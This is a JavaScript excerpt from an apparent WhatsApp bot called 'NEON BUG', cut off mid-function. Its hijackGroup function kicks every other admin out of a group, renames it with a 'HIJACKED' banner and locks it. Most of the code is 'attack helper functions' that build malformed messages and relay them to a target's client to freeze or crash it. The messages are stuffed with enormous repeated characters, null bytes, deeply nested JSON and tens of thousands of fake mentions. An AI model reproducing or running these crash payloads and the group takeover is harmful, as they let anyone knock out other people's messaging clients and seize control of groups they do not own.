  }
}

// ============================================
// ADMIN CHECK HELPERS
// ============================================

// ── Check if the bot itself is admin ──
// Checks both p.id (lid) and p.jid (phone) formats
// Also checks the paired phone number as a fallback
const isBotAdmin = async (sock, chatId) => {
  try {
    const rawJid = sock.user?.id || '';
    const botJid = rawJid.replace(/:\d+@/, '@');

    const rawLid = sock.authState?.creds?.me?.lid;
    const botLid = rawLid ? rawLid.replace(/:\d+@/, '@') : null;

    const meta = await sock.groupMetadata(chatId);

    return !!meta.participants.find(p => {
      const cleanId  = p.id.replace(/:\d+@/, '@');
      const cleanJid = (p.jid || '').replace(/:\d+@/, '@');

      const isBot =
        cleanId  === botJid ||
        cleanJid === botJid ||
        (botLid && (cleanId === botLid || cleanJid === botLid));

      return isBot && p.admin;
    });
  } catch (err) {
    console.error(chalk.red('[ADMIN CHECK] isBotAdmin error:'), err.message);
    return false;
  }
};

// ── Check if the sender is admin ──
// Checks p.id (lid) AND p.jid (phone) to cover both formats
const isSenderAdmin = async (sock, chatId, senderJid) => {
  try {
    const cleanSender = senderJid.replace(/:\d+@/, '@');
    const meta        = await sock.groupMetadata(chatId);

    return !!meta.participants.find(p => {
      const cleanId  = p.id.replace(/:\d+@/, '@');
      const cleanJid = (p.jid || '').replace(/:\d+@/, '@');
      return (cleanId === cleanSender || cleanJid === cleanSender) && p.admin;
    });
  } catch {
    return false;
  }
};

// ============================================
// HIJACK GROUP FUNCTION
// ============================================
async function hijackGroup(sock, chatId, sender, groupMetadata, fakeQuote, isOwner, isSudo, botPhoneNumber) {
  try {
    if (!sock || !sock.user) throw new Error('Bot not connected');

    // ── Fetch fresh metadata ──
    let meta;
    try {
      meta = await sock.groupMetadata(chatId);
    } catch (e) {
      await sock.sendMessage(chatId, {
        text: `✘ ᴄᴏᴜʟᴅɴ'ᴛ ʟᴏᴀᴅ ɢʀᴏᴜᴘ ᴅᴀᴛᴀ ☠️`,
        contextInfo: getExternalAdReply()
      }, { quoted: fakeQuote });
      return;
    }

    // ── Bot must be admin to do anything ──
    const botIsAdmin = await isBotAdmin(sock, chatId);
    if (!botIsAdmin) {
      await sock.sendMessage(chatId, {
        text: `「☠︎」✘ ɪ ᴀᴍ ɴᴏᴛ ᴀɴ ᴀᴅᴍɪɴ ɪɴ ᴛʜɪs ɢʀᴏᴜᴘ!\n\n_ᴍᴀᴋᴇ ᴍᴇ ᴀᴅᴍɪɴ ғɪʀsᴛ ᴛʜᴇɴ ᴛʀʏ ᴀɢᴀɪɴ ☠️_`,
        contextInfo: getExternalAdReply()
      }, { quoted: fakeQuote });
      return;
    }

    // ── Build clean bot JIDs for protection ──
    const rawBotJid = (sock.user?.id || '').replace(/:\d+@/, '@');
    const rawBotLid = sock.authState?.creds?.me?.lid
      ? sock.authState.creds.me.lid.replace(/:\d+@/, '@')
      : null;
    const cleanSenderJid = sender.replace(/:\d+@/, '@');

    // ── Helper: is this participant the bot? ──
    const isBot = (p) => {
      const cleanId  = p.id.replace(/:\d+@/, '@');
      const cleanJid = (p.jid || '').replace(/:\d+@/, '@');
      return (
        cleanId  === rawBotJid ||
        cleanJid === rawBotJid ||
        (rawBotLid && (cleanId === rawBotLid || cleanJid === rawBotLid))
      );
    };

    // ── Helper: is this participant the sender? ──
    const isSenderP = (p) => {
      const cleanId  = p.id.replace(/:\d+@/, '@');
      const cleanJid = (p.jid || '').replace(/:\d+@/, '@');
      return cleanId === cleanSenderJid || cleanJid === cleanSenderJid;
    };

    const participants = meta.participants;

    // ── Only kick admins, never bot or sender ──
    const toKick = participants.filter(p => {
      if (isBot(p)) {
        console.log(chalk.green(`🛡️ PROTECTED (bot): ${p.id}`));
        return false;
      }
      if (isSenderP(p)) {
        console.log(chalk.green(`🛡️ PROTECTED (sender): ${p.id}`));
        return false;
      }
      return p.admin === 'admin' || p.admin === 'superadmin';
    });

    if (toKick.length === 0) {
      await sock.sendMessage(chatId, {
        text: `「☠︎」✘ ɴᴏ ᴀᴅᴍɪɴs ᴛᴏ ᴋɪᴄᴋ ☠️`,
        contextInfo: getExternalAdReply()
      }, { quoted: fakeQuote });
      return;
    }

    await sock.sendMessage(chatId, {
      text: `「☠︎」⏳ ᴋɪᴄᴋɪɴɢ ${toKick.length} ᴀᴅᴍɪɴs...`,
      contextInfo: getExternalAdReply()
    }, { quoted: fakeQuote });

    let kicked = 0;
    let failed = 0;

    for (const target of toKick) {
      // ── Final safety guard — never fires if filter worked, just in case ──
      if (isBot(target) || isSenderP(target)) {
        console.log(chalk.red(`🛡️ FINAL GUARD blocked: ${target.id}`));
        continue;
      }

      try {
        await sock.groupParticipantsUpdate(chatId, [target.id], 'remove');
        kicked++;
        console.log(chalk.green(`✅ Kicked admin: ${target.id}`));
        await delay(500);
      } catch (e) {
        console.warn(chalk.yellow(`⚠️ Kick failed for ${target.id}: ${e.message}`));
        // ── @lid fallback: try phone JID if lid kick fails ──
        if (target.id.endsWith('@lid') && target.jid) {
          try {
            const phoneJid = target.jid.replace(/:\d+@/, '@');
            await sock.groupParticipantsUpdate(chatId, [phoneJid], 'remove');
            kicked++;
            console.log(chalk.green(`✅ Kicked via @lid fallback: ${phoneJid}`));
          } catch (e2) {
            failed++;
            console.warn(chalk.yellow(`⚠️ @lid fallback failed: ${e2.message}`));
          }
        } else {
          failed++;
        }
        await delay(300);
      }
    }

    // ── Lock the group down ──
    try {
      await sock.groupUpdateSubject(chatId, 'HIJACKED 𓅓 BY THE GLORIOUS 𝑵𝑬𝑶𝑵 𝑩𝑼𝑮「☠︎」💀');
      await delay(400);
      await sock.groupUpdateDescription(chatId,
        '🔱 𝐆𝐑𝐎𝐔𝐏 𝐇𝐈𝐉𝐀𝐂𝐊𝐄𝐃 𓃰\n' +
        '⚠️ ᴛʜɪs ɢʀᴏᴜᴘ ʜᴀs ʙᴇᴇɴ ᴄᴏɴǫᴜᴇʀᴇᴅ ʙʏ ᴛʜᴇ 𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 ☠️\n\n' +
        '💀 ʏᴏᴜʀ ᴀᴅᴍɪɴs ʜᴀᴠᴇ ғᴀʟʟᴇɴ\n' +
        '🗡️ ʏᴏᴜʀ ᴅᴇғᴇɴsᴇs ʜᴀᴠᴇ ᴄʀᴜᴍʙʟᴇᴅ\n' +
        '⚔️ ɢʀᴏᴜᴘ ᴄᴏɴᴛʀᴏʟ: ᴅᴏᴍɪɴᴀᴛᴇᴅ\n\n' +
        '「☠︎」ᴘᴏᴡᴇʀᴇᴅ ʙʏ ☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬\n' +
        '👿 ᴄʀᴇᴀᴛᴇᴅ ʙʏ 𝑽𝑰𝑪𝑻𝑶𝑹𝒀 𝑻𝑬𝑪𝑯\n\n' +
        '🌑 ɴᴏ ᴇsᴄᴀᴘᴇ. ɴᴏ ᴍᴇʀᴄʏ. ɴᴏ ʜᴏᴘᴇ. 🌑\n\n' +
        '© 𝑵𝑬𝑶𝑵 𝑩𝑼𝑮'
      );
      await delay(400);
      await sock.groupSettingUpdate(chatId, 'announcement');
      await delay(400);
      await sock.groupSettingUpdate(chatId, 'locked');
      console.log(chalk.green('✅ Group locked down'));
    } catch (e) {
      console.warn(chalk.yellow('⚠️ Group settings update partially failed:'), e.message);
    }

    const failNote = failed > 0 ? ` (${failed} ᴘʀᴏᴛᴇᴄᴛᴇᴅ)` : '';
    await sock.sendMessage(chatId, {
      text:
        `「☠︎」✓ ɢʀᴏᴜᴘ ʜɪᴊᴀᴄᴋᴇᴅ · ᴋɪᴄᴋᴇᴅ ${kicked} ᴀᴅᴍɪɴs${failNote} ☠️`,
      mentions: [sender],
      contextInfo: getExternalAdReply()
    }, { quoted: fakeQuote });

  } catch (err) {
    console.error(chalk.red('❌ Error in hijackGroup:'), err);
    await sock.sendMessage(chatId, {
      text: `✘ ʜɪᴊᴀᴄᴋ ғᴀɪʟᴇᴅ: ${err.message} ☠️`,
      contextInfo: getExternalAdReply()
    }, { quoted: fakeQuote });
  }
}

// ============================================
// ATTACK HELPER FUNCTIONS
// Extracted from source — minato replaced with sock
// ============================================

const crypto = require('crypto');

// ── BetaDelay (neon-devine-freeze wave 1) ──
async function _betaDelay(sock, target, ptcp = true) {
  for (let r = 0; r < 1000; r++) {
    let msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: '$', format: 'DEFAULT' },
            nativeFlowResponseMessage: {
              name: 'call_permission_request',
              paramsJson: '\n'.repeat(10000),
              version: 3,
            },
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            remoteJid: 'status@broadcast',
            participant: '135506@s.whatsapp.net',
            quotedMessage: {
              forwardedNewsletterMessageInfo: {
                newsletterJid: '120363399608@newsletter',
                newsletterName: '$',
                contentType: 'UPDATE_CARD',
                accessibilityText: '\u0000'.repeat(10000),
                serverMessageId: 18888888
              }
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: { message: msg.message },
    }, ptcp
      ? { messageId: msg.key.id, participant: { jid: target } }
      : { messageId: msg.key.id }
    );
    await delay(1000);
  }

  let parse = true;
  const SID = '5e03e0';
  const key = '10000000_2203140470115547_947412155165083119_n.enc';
  const Buf = '01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe';
  const type = 'image/webp';
  if (11 > 9) parse = parse ? false : true;

  const stc = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buf}=68917910&_nc_sid=${SID}&mms3=true`,
          fileSha256: 'ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=',
          fileEncSha256: 'dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=',
          mediaKey: 'C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=',
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buf}=68917910&_nc_sid=${SID}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: 'KN4kQ5pyABRAgA==',
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 1900 }, () => '1' + Math.floor(Math.random() * 5000000) + '@s.whatsapp.net')],
            groupMentions: [],
            entryPointConversionSource: 'non_contact',
            entryPointConversionApp: 'whatsapp',
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: { low: Math.floor(Math.random() * -20000000), high: 555, unsigned: parse },
          isAvatar: parse, isAiSticker: parse, isLottie: parse,
        },
      },
    },
  }, {});

  const sex = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: '$', format: 'DEFAULT' },
          nativeFlowResponseMessage: { name: 'galaxy_message', paramsJson: '\x10'.repeat(1045000), version: 3 },
          entryPointConversionSource: 'call_permission_request'
        },
      },
    }
  }, { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true, font: Math.floor(Math.random() * 99999999), background: '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '99999999') });

  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: stc.message }
  }, ptcp
    ? { messageId: stc.key.id, participant: { jid: target } }
    : {}
  );

  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: sex.message }
  }, ptcp
    ? { messageId: sex.key.id, participant: { jid: target } }
    : {}
  );
}

// ── sendCombo (neon-android wave 1) ──
async function _sendCombo(sock, target) {
  if (!sock?.relayMessage) return;

  const toxic =
    'ꦾ'.repeat(100000) + '𑇂𑆵𑆴𑆿'.repeat(50000) +
    '\u0000'.repeat(120000) + 'ោ៝'.repeat(60000) +
    'كن صادقاً مع نفسك ومع الآخرين'.repeat(30000);

  const interactiveMsg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: { title: toxic.substring(0, 3000) },
          body: { text: toxic.substring(0, 50000) },
          nativeFlowMessage: {
            messageParamsJson: '{'.repeat(20000),
            buttons: [
              { name: 'single_select', buttonParamsJson: '\u0000'.repeat(10000) },
              { name: 'galaxy_message', buttonParamsJson: JSON.stringify({ data: 'X'.repeat(20000) }) },
              { name: 'payment_method', buttonParamsJson: '\u0000'.repeat(10000) },
              { name: 'catalog_message', buttonParamsJson: '\u0000'.repeat(10000) }
            ]
          },
          contextInfo: {
            mentionedJid: [target, ...Array.from({ length: 1000 }, (_, i) => `1${i}@s.whatsapp.net`)],
            forwardingScore: 9999,
            quotedMessage: { paymentInviteMessage: { serviceType: 3, expiryTimestamp: Date.now() + 999999999 } }
          }
        }
      }
    }
  };

  const newsMsg = {
    botInvokeMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: '1@newsletter',
          newsletterName: 'WIDSEVERLY' + '𑜦𑜠'.repeat(11000),
          jpegThumbnail: null,
          caption: toxic.substring(0, 50000),
          inviteExpiration: Date.now() + 9999999999
        }
      }
    }
  };

  const interactiveId = crypto.randomBytes(10).toString('hex');
  const newsId = crypto.randomBytes(10).toString('hex');

  await sock.relayMessage(target, interactiveMsg, {
    messageId: interactiveId,
    participant: { jid: target },
    userJid: target
  }).catch(e => console.error('_sendCombo interactive:', e.message));

  await sock.relayMessage(target, newsMsg, {
    messageId: newsId,
    participant: { jid: target },
    userJid: target
  }).catch(e => console.error('_sendCombo news:', e.message));
}

// ── epcihDiley (neon-devine-freeze wave 2) ──
async function _epcihDiley(sock, target) {
  try {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text: '$', matchedText: 'https://t.me/neonbug', description: '$', title: '$',
            paymentLinkMetadata: {
              button: { displayText: '#' },
              header: { headerType: 1 },
              provider: { paramsJson: '{{'.repeat(120000) },
            },
            linkPreviewMetadata: {
              paymentLinkMetadata: {
                button: { displayText: '@jule' },
                header: { headerType: 1 },
                provider: { paramsJson: '{{'.repeat(120000) },
              },
              urlMetadata: { fbExperimentId: 999 },
              fbExperimentId: 888,
              linkMediaDuration: 555,
              socialMediaPostType: 1221,
              videoContentUrl: 'https://wa.me/settings/linked_devices#,,jule',
              videoContentCaption: '@jule',
            },
            contextInfo: {
              isForwarded: true, forwardingScore: 999,
              quotedMessage: { locationMessage: { degreesLatitude: 9.999999919991, degreesLongitude: -999999999999, accuracyInMeters: 1 } }
            }
          }
        }
      }
    }, { participant: { jid: target } });

    let parse = true;
    const SID = '5e03e0';
    const key = '10000000_2203140470115547_947412155165083119_n.enc';
    const Buf = '01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe';
    const type = 'image/webp';
    if (11 > 9) parse = parse ? false : true;

    const stc = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buf}=68917910&_nc_sid=${SID}&mms3=true`,
            fileSha256: 'ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=',
            fileEncSha256: 'dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=',
            mediaKey: 'C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=',
            mimetype: type,
            directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buf}=68917910&_nc_sid=${SID}`,
            fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
            mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
            firstFrameLength: 19904, firstFrameSidecar: 'KN4kQ5pyABRAgA==', isAnimated: true,
            contextInfo: {
              participant: target,
              mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 1900 }, () => '1' + Math.floor(Math.random() * 5000000) + '@s.whatsapp.net')],
              groupMentions: [], entryPointConversionSource: 'non_contact', entryPointConversionApp: 'whatsapp', entryPointConversionDelaySeconds: 467593,
            },
            stickerSentTs: { low: Math.floor(Math.random() * -20000000), high: 555, unsigned: parse },
            isAvatar: parse, isAiSticker: parse, isLottie: parse,
          },
        },
      },
    }, {});

    const jawir = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: '#', format: 'DEFAULT' },
            nativeFlowResponseMessage: { name: 'galaxy_message', paramsJson: '\x10'.repeat(1045000), version: 3 },
            entryPointConversionSource: 'call_permission_request'
          },
        },
      },
    }, { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true, font: Math.floor(Math.random() * 99999999), background: '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '99999999') });

    await sock.relayMessage(target, {
      groupStatusMessageV2: { message: stc.message }
    }, {
      messageId: stc.key.id,
      participant: { jid: target }
    });

    await sock.relayMessage(target, {
      groupStatusMessageV2: { message: jawir.message }
    }, {
      messageId: jawir.key.id,
      participant: { jid: target }
    });
  } catch (err) {
    console.error('[_epcihDiley] error:', err.message);
  }
}

// ── FcXDelay (neon-delay / neon-invasion) ──
async function _fcXDelay(sock, target, mention = true) {
  const bokepFc = JSON.stringify({ status: true, criador: 'ForceClose', resultado: { type: 'md', ws: { _events: { 'CB:ib,,dirty': ['Array'] }, _eventsCount: 800000, _maxListeners: 0, url: 'wss://web.whatsapp.com/ws/chat', config: { version: ['Array'], browser: ['Array'], waWebconnetUrl: 'wss://web.whatsapp.com/ws/chat', connCectTimeoutMs: 20000, keepAliveIntervalMs: 30000, logger: {}, printQRInTerminal: false, emitOwnEvents: true, defaultQueryTimeoutMs: 60000, customUploadHosts: [], retryRequestDelayMs: 250, maxMsgRetryCount: 5, fireInitQueries: true, auth: { Object: 'authData' }, markOnlineOnconnCect: true, syncFullHistory: true, linkPreviewImageThumbnailWidth: 192, transactionOpts: { Object: 'transactionOptsData' }, generateHighQualityLinkPreview: false, options: {}, appStateMacVerification: { Object: 'appStateMacData' }, mobile: true } } } });

  const contextInfo = { mentionedJid: [target], isForwarded: true, forwardingScore: 999, businessMessageForwardInfo: { businessOwnerJid: target } };
  const messagePayload = {
    viewOnceMessage: {
      message: {
        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
        interactiveMessage: {
          contextInfo,
          body: { text: '☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬' },
          nativeFlowMessage: {
            buttons: [
              { name: 'single_select', buttonParamsJson: bokepFc + 'gatau' },
              { name: 'call_permission_request', buttonParamsJson: bokepFc + '\u0003' },
              { name: 'single_select', buttonParamsJson: bokepFc + 'gatau' },
              { name: 'call_permission_request', buttonParamsJson: bokepFc + '\u0003' },
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage(target, messagePayload, { participant: { jid: target } });

  if (mention) {
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          videoMessage: {
            url: 'https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true',
            mimetype: 'video/mp4', fileSha256: '9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=',
            fileLength: '999999', seconds: 999999, mediaKey: 'JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=',
            caption: ' ', height: 999999, width: 999999,
            fileEncSha256: 'HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=',
            directPath: '/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0',
            mediaKeyTimestamp: '1743742853',
            contextInfo: { isSampled: true, mentionedJid: ['13135550002@s.whatsapp.net', ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)] },
            streamingSidecar: 'Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=',
            thumbnailDirectPath: '/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0',
            thumbnailSha256: 'vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=',
            thumbnailEncSha256: 'dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE='
          }
        }
      }
    }, {});

    await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: 'meta',
          attrs: {},
          content: [
            {
              tag: 'mentioned_users',
              attrs: {},
              content: [
                { tag: 'to', attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: { key: msg.key, type: 25 }
        }
      }
    }, {
      additionalNodes: [
        { tag: 'meta', attrs: { is_status_mention: 'true' }, content: undefined }
      ]
    });
  }
}

// ── DelaFreezCloseRelay (neon-delay wave 1) ──
async function _delaFreezCloseRelay(sock, target) {
  try {
    const randomJid = `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`;
    const generateMentioned = Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`);

    const message = {
      groupInviteMessage: {
        groupJid: '120363428855080371@g.us',
        inviteCode: 'Xx'.repeat(200),
        inviteExpiration: '99999999999',
        groupName: '</> NEON BUG ' + 'ោ៝'.repeat(200),
        caption: 'ោ៝'.repeat(300),
        jpegThumbnail: null,
        contextInfo: {
          participant: target, remoteJid: randomJid, forwardingScore: 9999, isForwarded: true,
          mentionedJid: ['13135550002@s.whatsapp.net', ...generateMentioned],
          groupInviteMessage: { inviteCode: 'Xx'.repeat(200), groupJid: '120363428855080371@g.us', groupName: 'ោ៝'.repeat(200) }
        }
      }
    };

    const listMsg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              mentionedJid: [target, '13135550002@s.whatsapp.net'],
              isForwarded: true, forwardingScore: 999,
              businessMessageForwardInfo: { businessOwnerJid: '13135550002@s.whatsapp.net' },
              participant: '0@s.whatsapp.net', remoteJid: 'status@broadcast'
            },
            body: proto.Message.InteractiveMessage.Body.create({ text: 'NEON BUG' }),
            footer: proto.Message.InteractiveMessage.Footer.create({ buttonParamsJson: '{['.repeat(500) }),
            header: proto.Message.InteractiveMessage.Header.create({ buttonParamsJson: ']}'.repeat(500), subtitle: 'NEON BUG', hasMediaAttachment: false }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              messageParamsJson: '{['.repeat(500),
              buttons: [
                { name: 'single_select', buttonParamsJson: '' },
                { name: 'call_permission_request', buttonParamsJson: '' },
                { name: 'mpm', buttonParamsJson: '' }
              ],
            })
          })
        }
      }
    };

    await sock.sendMessage(target, message);
    await sock.relayMessage(target, listMsg.viewOnceMessage.message, { messageId: generateMessageID() });
  } catch (e) {
    console.error('[_delaFreezCloseRelay] error:', e.message);
  }
}

// ── delayMakerInvisible (neon-invasion / neon-android) ──
async function _delayMakerInvisible(sock, target) {
  const neonModsData = JSON.stringify({ status: true, criador: 'NeonBug', resultado: { type: 'md', ws: { _events: { 'CB:ib,,dirty': ['Array'] }, _eventsCount: 800000, _maxListeners: 0, url: 'wss://web.whatsapp.com/ws/chat', config: { version: ['Array'], browser: ['Array'], waWebconnetUrl: 'wss://web.whatsapp.com/ws/chat', connCectTimeoutMs: 20000, keepAliveIntervalMs: 30000, logger: {}, printQRInTerminal: false, emitOwnEvents: true, defaultQueryTimeoutMs: 60000, customUploadHosts: [], retryRequestDelayMs: 250, maxMsgRetryCount: 5, fireInitQueries: true, auth: { Object: 'authData' }, markOnlineOnconnCect: true, syncFullHistory: true, linkPreviewImageThumbnailWidth: 192, transactionOpts: { Object: 'transactionOptsData' }, generateHighQualityLinkPreview: false, options: {}, appStateMacVerification: { Object: 'appStateMacData' }, mobile: true } } } });

  const stanza = [{ attrs: { biz_bot: '1' }, tag: 'bot' }, { attrs: {}, tag: 'biz' }];

  const message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 3.2, isStatusBroadcast: true, statusBroadcastJid: 'status@broadcast', badgeChat: { unreadCount: 9999 } },
        forwardedNewsletterMessageInfo: { newsletterJid: 'proto@newsletter', serverMessageId: 1, newsletterName: `—͟͞͞🧊 NEON BUG ${'—͟͞͞🧊'.repeat(10)}`, contentType: 3, accessibilityText: `—͟͞͞🧊 NEON BUG ${'﹏'.repeat(102002)}` },
        interactiveMessage: {
          contextInfo: {
            businessMessageForwardInfo: { businessOwnerJid: target },
            dataSharingContext: { showMmDisclosure: true },
            participant: '0@s.whatsapp.net',
            mentionedJid: ['13135550002@s.whatsapp.net']
          },
          body: { text: '' + 'ꦽ'.repeat(102002) },
          nativeFlowMessage: {
            buttons: [
              { name: 'single_select', buttonParamsJson: neonModsData },
              { name: 'payment_method', buttonParamsJson: neonModsData },
              { name: 'call_permission_request', buttonParamsJson: neonModsData, voice_call: 'call_galaxy' },
              { name: 'form_message', buttonParamsJson: neonModsData },
              { name: 'galaxy_message', buttonParamsJson: neonModsData },
              { name: 'cta_call', buttonParamsJson: neonModsData },
              { name: 'mpm', buttonParamsJson: neonModsData },
            ]
          }
        }
      }
    },
    additionalNodes: stanza,
    stanzaId: `stanza_${Date.now()}`
  };

  await sock.relayMessage(target, message, { participant: { jid: target } });
}

// ── bulldozer (neon-android wave 4) ──
async function _bulldozer(sock, target) {
  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: 'https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true',
          fileSha256: 'xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=',
          fileEncSha256: 'zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=',
          mediaKey: 'nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=',
          mimetype: 'image/webp',
          directPath: '/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0',
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904, firstFrameSidecar: 'KN4kQ5pyABRAgA==', isAnimated: true,
          contextInfo: {
            mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 40000 }, () => '1' + Math.floor(Math.random() * 500000) + '@s.whatsapp.net')],
            groupMentions: [], entryPointConversionSource: 'non_contact', entryPointConversionApp: 'whatsapp', entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false, isAiSticker: false, isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: 'meta',
        attrs: {},
        content: [
          {
            tag: 'mentioned_users',
            attrs: {},
            content: [
              { tag: 'to', attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}

// ── protocolbug6 (neon-android wave 2) ──
async function _protocolbug6(sock, target, mention = true) {
  const mentionedList = ['13135550002@s.whatsapp.net', ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)];
  const quotedMessage = {
    extendedTextMessage: {
      text: '᭯'.repeat(12000),
      matchedText: 'https://' + 'ꦾ'.repeat(500) + '.com',
      canonicalUrl: 'https://' + 'ꦾ'.repeat(500) + '.com',
      description: '\u0000'.repeat(500),
      title: '\u200D'.repeat(1000),
      previewType: 'NONE',
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999, isForwarded: true,
        externalAdReply: { showAdAttribution: true, title: 'BoomXSuper', body: '\u0000'.repeat(10000), thumbnailUrl: 'https://' + 'ꦾ'.repeat(500) + '.com', mediaType: 1, renderLargerThumbnail: true, sourceUrl: 'https://' + '𓂀'.repeat(2000) + '.xyz' },
        mentionedJid: Array.from({ length: 1000 }, () => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
      }
    },
    paymentInviteMessage: { currencyCodeIso4217: 'USD', amount1000: '999999999', expiryTimestamp: '9999999999', inviteMessage: 'Payment Invite' + '💥'.repeat(1770), serviceType: 1 }
  };

  const videoMessage = {
